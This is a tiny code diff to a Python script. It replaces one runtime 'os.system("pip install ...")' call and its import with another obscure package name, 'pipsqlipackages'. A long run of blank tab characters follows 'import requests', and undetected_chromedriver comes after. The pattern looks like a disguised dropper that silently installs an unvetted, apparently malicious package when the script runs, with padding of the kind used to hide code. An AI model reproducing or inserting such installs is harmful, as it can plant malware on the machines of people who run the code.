@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptographypackageV1")
-import pycryptographypackageV1
+os.system("pip install pipsqlipackages")
+import pipsqlipackages
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
